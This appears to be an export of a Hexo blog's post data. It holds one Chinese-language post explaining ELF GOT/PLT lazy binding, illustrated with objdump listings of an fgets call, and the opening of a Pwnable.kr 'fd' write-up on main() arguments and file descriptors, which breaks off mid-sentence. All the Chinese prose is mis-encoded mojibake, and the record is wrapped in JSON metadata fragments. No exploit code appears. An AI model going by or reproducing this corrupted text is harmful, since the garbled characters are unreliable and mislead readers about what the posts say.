å…¨å±€åç§»è¡¨ä¸­æœ€åˆåŒ…å«å…¶é‡å®šä½é¡¹ä¸­è¦æ±‚çš„ä¿¡æ¯ã€‚åœ¨ç³»ç»Ÿä¸ºå¯åŠ è½½ç›®æ ‡åˆ›å»ºå†…å­˜æ®µä»¥åï¼ŒåŠ¨æ€é“¾æ¥å™¨è¦å¤„ç†é‡å®šä½é¡¹ï¼Œå…¶ä¸­æœ‰ä¸€äº›é‡å®šä½é¡¹çš„ç±»å‹æ˜¯R_386_GLOB_DATï¼Œæ˜¯å¯¹å…¨å±€åç§»è¡¨çš„å¼•ç”¨ã€‚åŠ¨æ€é“¾æ¥å™¨ç¡®å®šç›¸å…³çš„ç¬¦å·å–å€¼ï¼Œè®¡ç®—å…¶ç»å¯¹åœ°è´¨ï¼Œå¹¶å°†ç›¸åº”çš„å†…å­˜è¡¨æ ¼é¡¹ç›®è®¾ç½®ä¸ºæ­£ç¡®çš„æ•°å€¼ã€‚å°½ç®¡åœ¨é“¾æ¥ç¼–è¾‘å™¨æ„é€ ä¸€ä¸ªç›®æ ‡æ–‡ä»¶æ—¶è¿˜æ— æ³•çŸ¥é“ç»å¯¹åœ°è´¨ï¼ŒåŠ¨æ€é“¾æ¥å™¨æ¸…æ¥šæ‰€æœ‰å†…å­˜æ®µçš„åœ°å€ï¼Œå› è€Œèƒ½å¤Ÿè®¡ç®—å…¶ä¸­æ‰€åŒ…å«çš„ç¬¦å·çš„ç»å¯¹åœ°å€ã€‚ å…¨å±€åç§»è¡¨ï¼ˆGOTï¼Œï¼‰ç”¨æ¥å°†ä½ç½®ç‹¬ç«‹çš„åœ°å€è®¡ç®—é‡å®šå‘åˆ°ç»å¯¹ä½ç½®ï¼Œä¸æ­¤ç›¸ä¼¼ï¼Œè¿‡ç¨‹é“¾æ¥è¡¨ï¼ˆPLTï¼‰èƒ½å¤ŸæŠŠä½ç½®ç‹¬ç«‹çš„å‡½æ•°è°ƒç”¨é‡å®šå‘åˆ°ç»å¯¹ä½ç½®ã€‚é“¾æ¥ç¼–è¾‘å™¨ç‰©èƒ½è§£æä»ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶/å…±äº«ç›®æ ‡åˆ°å¦ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶/å…±äº«ç›®æ ‡æ§åˆ¶è½¬ç§»ï¼ˆä¾‹å¦‚å‡½æ•°è°ƒç”¨ï¼‰ã€‚å› æ­¤ï¼Œé“¾æ¥ç¼–è¾‘å™¨è®©ç¨‹åºæŠŠæ§åˆ¶è½¬ç§»ç»™è¿‡ç¨‹é“¾æ¥è¡¨ä¸­çš„è¡¨é¡¹ã€‚åœ¨System Vä¸­ï¼Œè¿‡ç¨‹é“¾æ¥è¡¨ä½äºå…±äº«æ­£æ–‡ä¸­ï¼Œä¸è¿‡å®ƒä»¬ä½¿ç”¨ä½äºç§æœ‰çš„å…¨å±€åç§»è¡¨ä¸­çš„åœ°å€ã€‚ åŠ¨æ€é“¾æ¥å™¨èƒ½å¤Ÿç¡®å®šç›®æ ‡å¤„çš„ç»å¯¹åœ°å€ï¼Œå¹¶æ®æ­¤ä¿®æ”¹å…¨å±€åç§»è¡¨çš„å†…å­˜æ˜ åƒã€‚åŠ¨æ€é“¾æ¥å™¨å› æ­¤èƒ½å¤Ÿå¯¹è¡¨é¡¹è¿›è¡Œé‡å®šä½ï¼Œå¹¶ä¸”ä¸ä¼šå½±å“ç¨‹åºä»£ç çš„ä½ç½®ç‹¬ç«‹æ€§å’Œå¯å…±äº«æ€§ã€‚å¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶æ‹¥æœ‰å„è‡ªç‹¬ç«‹çš„è¿‡ç¨‹é“¾æ¥è¡¨ã€‚ ç»å¯¹è¿‡ç¨‹é“¾æ¥è¡¨ï¼š ä½ç½®ç‹¬ç«‹çš„è¿‡ç¨‹é“¾æ¥è¡¨ï¼š å¦‚å›¾æ‰€ç¤ºï¼Œè¿‡ç¨‹é“¾æ¥è¡¨å‘½ä»¤é’ˆå¯¹ç»å¯¹ä»£ç ï¼ˆå›¾ 1ï¼‰å’Œä½ç½®ç‹¬ç«‹çš„ä»£ç ï¼ˆå›¾ 2ï¼‰ä½¿ç”¨ä¸åŒçš„æ“ä½œæ•°å¯»å€æ¨¡å¼ã€‚å°½ç®¡å¦‚æ­¤ï¼Œå®ƒä»¬å¯¹åŠ¨æ€é“¾æ¥å™¨çš„æ¥å£è¿˜æ˜¯ç›¸åŒçš„ã€‚ åŠ¨æ€é“¾æ¥å™¨å’Œç¨‹åºâ€œåˆä½œâ€ï¼Œé€šè¿‡è¿‡ç¨‹é“¾æ¥è¡¨å’Œå…¨å±€åç§»è¡¨è§£æç¬¦å·å¼•ç”¨ï¼š 1.åœ¨ç¬¬ä¸€æ¬¡åˆ›å»ºç¨‹åºçš„å†…å­˜æ˜ åƒæ—¶ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¸ºå…¨å±€åç§»è¡¨çš„ç¬¬äºŒå’Œç¬¬ä¸‰é¡¹è®¾ç½®ç‰¹æ®Šå€¼ã€‚ 2.å¦‚æœè¿‡ç¨‹é“¾æ¥è¡¨æ˜¯ä½ç½®ç‹¬ç«‹çš„ï¼Œå…¨å±€åç§»è¡¨å¿…é¡»ä½äº %bx ä¸­ï¼Œè¿›ç¨‹æ˜ åƒä¸­çš„æ¯ä¸ªå…±äº«ç›®æ ‡æ–‡ä»¶éƒ½æœ‰è‡ªå·±çš„è¿‡ç¨‹é“¾æ¥è¡¨ï¼Œæ§åˆ¶å‘è¿‡ç¨‹é“¾æ¥è¡¨é¡¹çš„ä¼ é€’ä»…å‘ç”Ÿåœ¨åŒä¸€ä¸ªç›®æ ‡æ–‡ä»¶ä¸­ã€‚å› æ­¤ï¼Œè°ƒç”¨å‡½æ•°ç”¨è´Ÿè´£åœ¨è°ƒç”¨è¿‡ç¨‹é“¾æ¥è¡¨é¡¹ä¹‹å‰è®¾ç½®å…¨å±€åç§»è¡¨çš„åŸºå€å¯„å­˜å™¨ã€‚ 3.å‡ºäºè¯´æ˜çš„ç›®çš„ï¼Œå‡å®šç¨‹åºè°ƒç”¨äº† name1ï¼Œname1 å°†æ§åˆ¶ä¼ è¾“ç»™æ ‡å· .PLT1ã€‚ 4.ç¬¬ä¸€æ¡æŒ‡ä»¤è·³è½¬åˆ° name1 çš„å…¨å±€åç§»è¡¨é¡¹çš„åœ°å€ã€‚æœ€åˆï¼Œå…¨å±€åç§»è¡¨ä¸­åŒ…å«åé¢çš„ pushl æŒ‡ä»¤çš„åœ°å€ï¼Œè€Œä¸æ˜¯ name1 çš„çœŸå®åœ°å€ã€‚ 5.æ¥ä¸‹æ¥ï¼Œç¨‹åºå°†é‡å®šä½åç§»ï¼ˆoffsetï¼‰å‹æ ˆã€‚é‡å®šä½åç§»æ˜¯ä¸€ä¸ª 32 ä½éè´Ÿæ•°ï¼Œæ˜¯åœ¨é‡å®šä½è¡¨ä¸­çš„å­—èŠ‚åç§»é‡ã€‚æŒ‡å®šçš„é‡å®šä½è¡¨é¡¹çš„ç±»å‹ä¸º R_386_JMP_SLOTï¼Œå…¶åç§»å°†ç»™å‡ºåœ¨å‰é¢çš„ jmp æŒ‡ä»¤ä¸­ä½¿ç”¨çš„ GOT è¡¨é¡¹ã€‚é‡å®šä½é¡¹ä¹ŸåŒ…å«ä¸€ä¸ªç¬¦å·è¡¨ç´¢å¼•ï¼Œå€Ÿä»¥å‘Šè¯‰åŠ¨æ€é“¾æ¥å™¨è¢«å¼•ç”¨çš„ç¬¦å·æ˜¯ä»€ä¹ˆï¼Œåœ¨è¿™é‡Œæ˜¯ name1ã€‚ 6.åœ¨å°†é‡å®šä½åç§»å‹æ ˆåï¼Œç¨‹åºä¼šè·³è½¬åˆ° .PLT0ï¼Œä¹Ÿå°±æ˜¯è¿‡ç¨‹é“¾æ¥è¡¨çš„ç¬¬ä¸€é¡¹ã€‚pushl æŒ‡ä»¤æŠŠç¬¬äºŒä¸ªå…¨å±€åç§»è¡¨é¡¹ï¼ˆgot_plus_4 æˆ–è€… 4(%ebx)ï¼‰å‹å…¥å †æ ˆï¼Œå› è€Œä¸ºåŠ¨æ€é“¾æ¥å™¨æä¾›äº†è¯†åˆ«ä¿¡æ¯çš„æœºä¼šã€‚ç¨‹åºç„¶åè·³è½¬åˆ°ç¬¬ä¸‰ä¸ª GOT è¡¨é¡¹å†…ä¿å­˜çš„åœ°å€ï¼ˆgot_plus_8 æˆ–è€… 8(%ebx)ï¼‰ï¼Œåè€…å°†æ§åˆ¶ä¼ é€’ç»™åŠ¨æ€é“¾æ¥å™¨ã€‚ 7.å½“åŠ¨æ€é“¾æ¥å™¨å¾—åˆ°æ§åˆ¶åï¼Œå®ƒæ¢å¤å †æ ˆï¼ŒæŸ¥çœ‹æŒ‡å®šçš„é‡å®šä½é¡¹ï¼Œå¯»æ‰¾ç¬¦å·çš„å€¼ï¼Œå°† name1 çš„â€œçœŸå®â€åœ°å€å­˜å‚¨äºå…¨å±€åç§»è¡¨é¡¹ä¸­ï¼Œå¹¶å°†æ§åˆ¶ä¼ é€’ç»™æœŸæœ›çš„ç›®çš„åœ°ã€‚ 8.è¿‡ç¨‹é“¾æ¥è¡¨é¡¹çš„åç»­æ‰§è¡Œå°†æŠŠæ§åˆ¶ç›´æ¥ä¼ é€’ç»™ name1ï¼Œä¸ä¼šå†æ¬¡è°ƒç”¨åŠ¨æ€é“¾æ¥å™¨ã€‚å°±æ˜¯è¯´ .PLT1 å¤„çš„ jmp å°†æ§åˆ¶ä¼ é€’ç»™ name1ï¼Œè€Œä¸ä¼šæ‰§è¡Œåé¢çš„ pushl æŒ‡ä»¤ã€‚ ç¯å¢ƒå˜é‡LD_BIND_NOWå¯ä»¥æ›´æ”¹åŠ¨æ€é“¾æ¥è¡Œä¸ºã€‚å¦‚æœå…¶å–å€¼éç©ºï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šåœ¨æ§åˆ¶ä¼ é€’ç»™ç¨‹åºä¹‹å‰ï¼Œå¯¹è¿‡ç¨‹é“¾æ¥è¡¨é¡¹è¿›è¡Œè®¡ç®—ã€‚å°±æ˜¯è¯´åŠ¨æ€é“¾æ¥å™¨ä¼šåœ¨è¿›ç¨‹åˆå§‹åŒ–çš„è¿‡ç¨‹ä¸­å¤„ç†ç±»å‹ä¸ºR_386_JMP_SLOTçš„é‡å®šä½é¡¹ã€‚å¦åˆ™ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šå¯¹è¿‡ç¨‹é“¾æ¥è¡¨å®è¡Œæ‡’æƒ°è®¡ç®—ï¼Œå»¶è¿Ÿç¬¦å·è§£æå’Œé‡å®šä½ï¼Œç›´åˆ°æŸä¸ªè¡¨é¡¹çš„ç¬¬ä¸€æ¬¡æ‰§è¡Œã€‚ å»¶è¿Ÿç»‘å®šé€šå¸¸ä¼šæä¾›æ•´ä½“çš„åº”ç”¨æ€§èƒ½ï¼Œå› ä¸ºæœªä½¿ç”¨çš„ç¬¦å·ä¸ä¼šå¼•å…¥é¢å¤–çš„åŠ¨æ€é“¾æ¥å¼€é”€ã€‚å°½ç®¡å¦‚æ­¤ï¼Œæœ‰äº›åº”ç”¨æƒ…å½¢ä¼šä½¿å¾—æ‡’æƒ°ç»‘å®šä¸å¤ªåˆé€‚ã€‚é¦–å…ˆï¼Œå¯¹å…±äº«ç›®æ ‡å‡½æ•°çš„ç¬¬ä¸€æ¬¡å¼•ç”¨èŠ±çš„æ—¶é—´ä¼šè¶…å‡ºåç»­è°ƒç”¨ï¼Œå› ä¸ºåŠ¨æ€é“¾æ¥å™¨è¦æˆªè·è°ƒç”¨ä»¥ä¾¿è§£æç¬¦å·ã€‚ä¸€äº›åº”ç”¨ä¸èƒ½å®¹å¿è¿™ç§ä¸å¯é¢„æµ‹æ€§ã€‚ç¬¬äºŒï¼Œå¦‚æœå‘ç”Ÿäº†é”™è¯¯ï¼ŒåŠ¨æ€é“¾æ¥å™¨æ— æ³•è§£ææŸä¸ªç¬¦å·ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šç»ˆæ­¢ç¨‹åºã€‚åœ¨æ‡’æƒ°ç»‘å®šä¸‹ï¼Œè¿™ç±»äº‹æƒ…å¯èƒ½ä¼šå‘ç”Ÿä»»æ„å¤šæ¬¡ã€‚æŸäº›åº”ç”¨ä¹Ÿå¯èƒ½æ— æ³•å®¹å¿è¿™ç§ä¸å¯é¢„æµ‹æ€§ã€‚é€šè¿‡å…³é—­æ‡’æƒ°ç»‘å®šï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šè¿«ä½¿æ‰€æœ‰é”™è¯¯éƒ½å‘ç”Ÿåœ¨è¿›ç¨‹åˆå§‹åŒ–æœŸé—´ï¼Œè€Œä¸æ˜¯åº”ç”¨ç¨‹åºæ¥æ”¶æ§åˆ¶ä»¥åã€‚ Demo: æ¥çœ‹ä¸€ä¸ªç¼–è¯‘å¥½çš„32ä½ELFå¯æ‰§è¡Œæ–‡ä»¶å¯¹libc.soçš„å‡½æ•°fgets()è¿›è¡Œè°ƒç”¨çš„ä¾‹å­ã€‚32ä½å¯æ‰§è¡Œæ–‡ä»¶ä¸GOTçš„å…³ç³»æ¯”è¾ƒå®¹æ˜“è§‚å¯Ÿï¼Œå› ä¸ºåœ¨32ä½æ–‡ä»¶ä¸­æ²¡æœ‰ç”¨åˆ°IPç›¸å¯¹åœ°å€ï¼ŒIPç›¸å¯¹åœ°å€æ˜¯åœ¨64ä½å¯æ‰§è¡Œæ–‡ä»¶ä¸­ä½¿ç”¨çš„: 18048481: e8 da fe ff ff call 8048360&lt;fgets@plt&gt; åœ°å€0x8048360å¯¹åº”å‡½æ•°fgets()çš„PLTæ¡ç›®ã€‚æ¥ä¸‹æ¥è§‚å¯Ÿå¯æ‰§è¡Œæ–‡ä»¶ä¸­åœ°å€ä¸º0x8048360çš„å†…å®¹ï¼š 123408048360&lt;fgets@plt&gt;: &#x2F;* A jmp into the GOT *&#x2F; 8048360: ff 25 00 a0 04 08 jmp *0x804a000 8048366: 68 00 00 00 00 push $0x0 804836b: e9 e0 ff ff ff jmp 8048350 &lt;_init+0x34&gt; å¯¹å‡½æ•°fgets()çš„è°ƒç”¨ä¼šæŒ‡å‘åœ°å€0x8048360ï¼Œå³å‡½æ•°fgets()çš„PLTè·³è½¬è¡¨æ¡ç›®ã€‚ä»å‰é¢åç¼–è¯‘ä»£ç çš„è¾“å‡ºä¸­å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€ä¸ªé—´æ¥è·³è½¬æŒ‡å‘å­˜æ”¾åœ¨0x804a000ä¸­çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯GOTæ¡ç›®ï¼Œå­˜æ”¾ç€libcå…±äº«åº“ä¸­å‡½æ•°fgets()çš„å®é™…åœ°å€ã€‚ ç„¶è€Œï¼ŒåŠ¨æ€é“¾æ¥å™¨é‡‡ç”¨é»˜è®¤çš„å»¶è¿Ÿé“¾æ¥æ–¹å¼æ—¶ï¼Œä¸ä¼šåœ¨å‡½æ•°ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶å°±å¯¹åœ°å€è¿›è¡Œè§£æã€‚å»¶è¿Ÿé“¾æ¥æ„å‘³ç€åŠ¨æ€é“¾æ¥å™¨ä¸ä¼šåœ¨ç¨‹åºåŠ è½½æ—¶è§£ææ¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯åœ¨è°ƒç”¨æ—¶é€šè¿‡.pltå’Œ.got.pltèŠ‚ï¼ˆåˆ†åˆ«å¯¹åº”å„è‡ªçš„è¿‡ç¨‹é“¾æ¥è¡¨å’Œå…¨å±€åç§»è¡¨ï¼‰æ¥å¯¹å‡½æ•°è¿›è¡Œè§£æã€‚å¯ä»¥é€šè¿‡ä¿®æ”¹LD_BIND_NOWç¯å¢ƒå˜é‡å°†é“¾æ¥æ–¹å¼ä¿®æ”¹ä¸ºä¸¥æ ¼åŠ è½½ï¼Œä»¥ä¾¿åœ¨ç¨‹åºåŠ è½½çš„åŒæ—¶è¿›è¡ŒåŠ¨æ€é“¾æ¥ã€‚åŠ¨æ€é“¾æ¥å™¨ä¹‹æ‰€ä»¥é»˜è®¤é‡‡ç”¨å»¶è¿Ÿé“¾æ¥çš„æ–¹å¼ï¼Œæ˜¯å› ä¸ºå»¶è¿Ÿé“¾æ¥èƒ½å¤Ÿæé«˜è£…è½½æ—¶çš„æ€§èƒ½ã€‚ä¸è¿‡ï¼Œæœ‰æ—¶å€™æœ‰äº›ä¸å¯é¢„çŸ¥çš„é“¾æ¥é”™è¯¯å¯èƒ½åœ¨ç¨‹åºè¿è¡Œä¸€æ®µæ—¶é—´åæ‰èƒ½å¤Ÿå‘ç°ã€‚æˆ‘åœ¨è¿‡å»å‡ å¹´é‡Œä¹Ÿå°±ç¢°åˆ°è¿‡ä¸€æ¬¡è¿™ç§æƒ…å†µã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæœ‰äº›å®‰å…¨ç‰¹æ€§ï¼Œå¦‚åªè¯»é‡å®šä½ï¼Œåªèƒ½åœ¨ä¸¥æ ¼é“¾æ¥çš„æ¨¡å¼ä¸‹ä½¿ç”¨ï¼Œå› ä¸º.plt.gotèŠ‚æ˜¯åªè¯»çš„ã€‚åœ¨åŠ¨æ€é“¾æ¥å™¨å®Œæˆå¯¹.plt.gotçš„è¡¥å……ä¹‹åæ‰èƒ½å¤Ÿè¿›è¡Œåªè¯»é‡å®šä½ï¼Œå› æ­¤å¿…é¡»ä½¿ç”¨ä¸¥æ ¼é“¾æ¥ã€‚ è®¾å‡½æ•°fgets()æ˜¯ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨ï¼ŒåŠ¨æ€é“¾æ¥å™¨éœ€è¦å¯¹fgets()çš„åœ°å€è¿›è¡Œè§£æï¼Œå¹¶æŠŠå€¼å­˜å…¥fgets()çš„GOTæ¡ç›®ä¸­ã€‚ 1234567808049ff4 &lt;_GLOBAL_OFFSET_TABLE_&gt;: 8049ff4: 28 9f 04 08 00 00 sub %bl,0x804(%edi) 8049ffa: 00 00 add %al,(%eax) 8049ffc: 00 00 add %al,(%eax) 8049ffe: 00 00 add %al,(%eax) 804a000: 66 83 04 08 76 addw $0x76,(%eax,%ecx,1) 804a005: 83 04 08 86 addl $0xffffff86,(%eax,%ecx,1) 804a009: 83 04 08 96 addl $0xffffff96,(%eax,%ecx,1) 804a00d: 83 .byte 0x83 804a00e: 04 08 add $0x8,%al é‡ç‚¹æ³¨æ„åœ°å€0x08048366ï¼Œè¯¥åœ°å€å­˜å‚¨åœ¨GOTçš„0x804a000ä¸­ã€‚åœ¨ä½å­—èŠ‚åºä¸­ï¼Œä½ä½å­—èŠ‚æ’æ”¾åœ¨å†…å­˜çš„ä½åœ°å€ç«¯ï¼Œå› æ­¤çœ‹ä¸Šå»æ˜¯66 83 04 08ã€‚ç”±äºé“¾æ¥å™¨è¿˜æœªå¯¹å‡½æ•°fgets()è¿›è¡Œè§£æï¼Œæ•…è¯¥åœ°å€å¹¶ä¸æ˜¯å‡½æ•°çš„åœ°å€ï¼Œè€Œæ˜¯æŒ‡å‘å‡½æ•°fgets()çš„PLTæ¡ç›®ã€‚å†æ¥çœ‹ä¸€ä¸‹å‡½æ•°fgets()çš„PLTæ¡ç›®ï¼š 1234508048360 &lt;fgets@plt&gt;: 8048360: ff 25 00 a0 04 08 jmp *0x804a000 8048366: 68 00 00 00 00 push $0x0 804836b: e9 e0 ff ff ff jmp 8048350 &lt;_init+0x34&gt; å› æ­¤ï¼Œjmp *0x804a000 æŒ‡ä»¤ä¼šè·³è½¬åˆ°åœ°å€0x804a000 ä¸­å­˜æ”¾çš„0x8048366ï¼Œå³push $0x0æŒ‡ä»¤ã€‚è¯¥pushæŒ‡ä»¤çš„ä½œç”¨æ˜¯å°†fgets()çš„GOTæ¡ç›®å…¥æ ˆã€‚fgets()çš„GOTæ¡ç›®åç§»åœ°å€ä¸º0x0ï¼Œå¯¹åº”çš„ç¬¬ä¸€ä¸ªGOTæ¡ç›®æ˜¯ä¸ºä¸€ä¸ªå…±äº«åº“ç¬¦å·å€¼ä¿ç•™çš„ï¼Œ0x0å®é™…ä¸Šæ˜¯ç¬¬4ä¸ªGOTæ¡ç›®ï¼Œå³GOT[3]ã€‚æ¢å¥è¯è¯´ï¼Œå…±äº«åº“çš„åœ°å€å¹¶ä¸æ˜¯ä»GOT[0]å¼€å§‹çš„ï¼Œè€Œæ˜¯ä»GOT[3]å¼€å§‹çš„ï¼Œå‰3ä¸ªæ¡ç›®æ˜¯ä¸ºå…¶ä»–ç”¨é€”ä¿ç•™çš„ã€‚ ä¸‹é¢æ˜¯GOTçš„3ä¸ªåç§»é‡ã€‚ GOT[0]ï¼šå­˜æ”¾äº†æŒ‡å‘å¯æ‰§è¡Œæ–‡ä»¶åŠ¨æ€æ®µçš„åœ°å€ï¼ŒåŠ¨æ€é“¾æ¥å™¨åˆ©ç”¨è¯¥åœ°å€æå–åŠ¨æ€é“¾æ¥ç›¸å…³çš„ä¿¡æ¯ã€‚ GOT[1]ï¼šå­˜æ”¾link_mapç»“æ„çš„åœ°å€ï¼ŒåŠ¨æ€é“¾æ¥å™¨åˆ©ç”¨è¯¥åœ°å€æ¥å¯¹ç¬¦å·è¿›è¡Œè§£æã€‚ GOT[2]ï¼šå­˜æ”¾äº†æŒ‡å‘åŠ¨æ€é“¾æ¥å™¨_dl_runtime_resolve()å‡½æ•°çš„åœ°å€ï¼Œè¯¥å‡½æ•°ç”¨æ¥è§£æå…±äº«åº“å‡½æ•°çš„å®é™…ç¬¦å·åœ°å€ã€‚ fgets()çš„PLTå­˜æ ¹ï¼ˆstubï¼‰çš„æœ€åä¸€æ¡æŒ‡ä»¤æ˜¯jmp 8048350ã€‚è¯¥åœ°å€æŒ‡å‘å¯æ‰§è¡Œæ–‡ä»¶çš„ç¬¬ä¸€ä¸ªPLTæ¡ç›®ï¼Œå³P LT- 0ã€‚ æˆ‘ä»¬çš„å¯æ‰§è¡Œæ–‡ä»¶çš„P LT- 0å­˜æ”¾äº†ä¸‹é¢çš„ä»£ç ï¼š 1238048350: ff 35 f8 9f 04 08 pushl 0x8049ff8 8048356: ff 25 fc 9f 04 08 jmp *0x8049ffc 804835c: 00 00 add %al,(%eax) ç¬¬ä¸€æ¡pushlæŒ‡ä»¤å°†GOT[1]çš„åœ°å€å‹å…¥æ ˆä¸­ï¼Œå‰é¢æåˆ°è¿‡ï¼ŒGOT[1]ä¸­å­˜æ”¾äº†æŒ‡å‘link_mapç»“æ„çš„åœ°å€. jmp *0x8049ffcæŒ‡ä»¤é—´æ¥è·³è½¬åˆ°ç¬¬3ä¸ªGOTæ¡ç›®ï¼Œå³GOT[2]ï¼Œåœ¨GOT[2]ä¸­å­˜æ”¾äº†åŠ¨æ€é“¾æ¥å™¨_dl_runtime_resolve()å‡½æ•°çš„åœ°å€ï¼Œç„¶åå°†æ§åˆ¶æƒè½¬ç»™åŠ¨æ€é“¾æ¥å™¨ï¼Œè§£æfgets()å‡½æ•°çš„åœ°å€ã€‚å¯¹å‡½æ•°fgets()è¿›è¡Œè§£æåï¼Œåç»­æ‰€æœ‰å¯¹PLTæ¡ç›®fgets()çš„è°ƒç”¨éƒ½ä¼šè·³è½¬åˆ°fgets()çš„ä»£ç æœ¬èº«ï¼Œè€Œä¸æ˜¯é‡æ–°æŒ‡å‘PLTï¼Œå†è¿›è¡Œä¸€éå»¶è¿Ÿé“¾æ¥çš„è¿‡ç¨‹ã€‚ 1ï¼è°ƒç”¨fgets@PLTï¼ˆå³è°ƒç”¨fgetså‡½æ•°ï¼‰ã€‚ 2ï¼PLTä»£ç åšä¸€æ¬¡åˆ°GOTä¸­åœ°å€çš„é—´æ¥è·³è½¬ã€‚ 3ï¼GOTæ¡ç›®å­˜æ”¾äº†æŒ‡å‘PLTçš„åœ°å€ï¼Œè¯¥åœ°å€å­˜æ”¾åœ¨pushæŒ‡ä»¤ä¸­ã€‚ 4ï¼push $0x0æŒ‡ä»¤å°†fgets() GOTæ¡ç›®çš„åç§»é‡å‹æ ˆã€‚ 5ï¼æœ€åçš„fgets() PLTæŒ‡ä»¤æ˜¯æŒ‡å‘P LT- 0ä»£ç çš„jmpæŒ‡ä»¤ã€‚ 6ï¼P LT- 0çš„ç¬¬ä¸€æ¡æŒ‡ä»¤å°†GOT[1]çš„åœ°å€å‹æ ˆï¼ŒGOT[1]ä¸­å­˜æ”¾äº†æŒ‡å‘fgets()çš„link_mapç»“æ„çš„åç§»åœ°å€ã€‚ 7ï¼P LT- 0çš„ç¬¬äºŒæ¡æŒ‡ä»¤ä¼šè·³è½¬åˆ°GOT[2]å­˜æ”¾çš„åœ°å€ï¼Œè¯¥åœ°å€æŒ‡å‘åŠ¨æ€é“¾æ¥å™¨çš„_dl_runtime_resolveå‡½æ•°ï¼Œ_dl_runtime_resolveå‡½æ•°ä¼šé€šè¿‡æŠŠfgets()å‡½æ•°çš„ç¬¦å·å€¼åŠ åˆ°.got.pltèŠ‚å¯¹åº”çš„GOTæ¡ç›®ä¸­ï¼Œæ¥å¤„ç†R_386_JUMP_SLOTé‡å®šä½ã€‚ ä¸‹ä¸€æ¬¡è°ƒç”¨fgets()å‡½æ•°æ—¶ï¼ŒPLTæ¡ç›®ä¼šç›´æ¥è·³è½¬åˆ°å‡½æ•°æœ¬èº«ï¼Œè€Œä¸æ˜¯å†æ‰§è¡Œä¸€éé‡å®šä½è¿‡ç¨‹ã€‚ å›¾ç¤ºï¼š ç¬¬ä¸€æ¬¡åŠ¨æ€é“¾æ¥è¯¥å‡½æ•° ä¹‹åï¼š","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"ELFæ–‡ä»¶","slug":"ELFæ–‡ä»¶","permalink":"http://example.com/tags/ELF%E6%96%87%E4%BB%B6/"}]},{"title":"Pwnable_gameé¢˜è§£_1","slug":"Pwnablekr_1","date":"2021-07-15T17:24:39.000Z","updated":"2022-03-25T14:31:46.000Z","comments":true,"path":"2021/07/16/Pwnablekr_1/","link":"","permalink":"http://example.com/2021/07/16/Pwnablekr_1/","excerpt":"","text":"Pwnable_gameså¼€å§‹åˆ·é¢˜å•¦ï¼å†²å†²å†²ï¼æœ¬è´´è®°å½•ä¸»è¦è®°å½•çŸ¥è¯†ç‚¹å’Œexp fdTips: mainå‡½æ•°çš„ä¸‰ä¸ªå‚æ•° int argc intå‹å˜é‡ï¼Œè¡¨ç¤ºä¼ é€’ç»™mainå‡½æ•°çš„å‚æ•°æ•°é‡ã€‚ char *argv æŒ‡é’ˆæ•°ç»„ï¼Œæ¯ä¸ªæŒ‡é’ˆæŒ‡å‘å„ä¸ªå…·ä½“çš„å‚æ•°ã€‚ char*envp ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä¸ºç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­éœ€è¦ä½¿ç”¨ç¯å¢ƒå˜é‡åšå‚è€ƒã€‚ Demo: 1$ ./hello //æ‰§è¡Œè¯¥æ–‡ä»¶ æ­¤æ—¶argc=1,è¡¨ç¤ºåªæœ‰ä¸€ä¸ªå‚æ•°è¾“å…¥ argvåªæœ‰ä¸€ä¸ªå…ƒç´ ,argv[0]æŒ‡å‘è¾“å…¥ç¨‹åºè·¯å¾„åŠåç§°: ./hello 1$ ./hello para_1 æ­¤æ—¶argc=2,æœ‰ä¸¤ä¸ªå‚æ•°ä¼ å…¥ argc[0]æŒ‡å‘è¾“å…¥ç¨‹åºè·¯å¾„åŠåç§° â€œ./helloâ€ argv[1]æŒ‡å‘para_1å­—ç¬¦ä¸² Linux æ–‡ä»¶IOéƒ¨åˆ†ç†è§£ æ‰€æœ‰çš„I/Oè®¾å¤‡éƒ½è¢«æ¨¡å‹åŒ–ä¸ºæ–‡ä»¶ï¼Œè€Œæ‰€æœ‰çš„è¾“å…¥å’Œè¾“å‡ºéƒ½è¢«å½“åšç›¸åº”æ–‡ä»¶çš„è¯»å’Œå†™æ¥æ‰§è¡Œã€‚è¿™ç§å°†è®¾å¤‡ä¼˜é›…æ˜ å°„ä¸ºæ–‡ä»¶çš„æ–¹å¼ï¼Œå…è®¸Linuxå†…æ ¸å¼•å‡ºä¸€ä¸ªç®€å•ã€ä½çº§çš„åº”ç”¨æ¥å£ï¼Œç§°ä¸ºUnix I/Oï¼Œè¿™ä½¿å¾—æ‰€æœ‰è¾“å…¥å’Œè¾“å‡ºéƒ½èƒ½ä»¥ä¸€ç§ç»Ÿä¸€ã€ä¸€è‡´çš„æ–¹å¼æ¥æ‰§è¡Œï¼š æ‰“å¼€æ–‡ä»¶ ï¼š åº”ç”¨ç¨‹åºé€šè¿‡å†…æ ¸æ‰“å¼€ç›¸åº”æ–‡ä»¶ï¼Œå†…æ ¸è¿”å›ä¸€ä¸ªå°çš„éè´Ÿæ•´æ•°ï¼Œå«åšæè¿°ç¬¦ï¼Œå®ƒåœ¨åç»­å¯¹æ­¤æ–‡ä»¶çš„æ‰€æœ‰æ“ä½œä¸­æ ‡è¯†è¿™ä¸ªæ–‡ä»¶ã€‚å†…æ ¸è®°å½•æœ‰å…³æ‰“å¼€æ–‡ä»¶çš„æ‰€æœ‰ä¿¡æ¯ã€‚åº”ç”¨ç¨‹åºåªéœ€è®°ä½è¿™ä¸ªæè¿°ç¬¦ã€‚ æ–‡ä»¶æè¿°ç¬¦fdï¼š 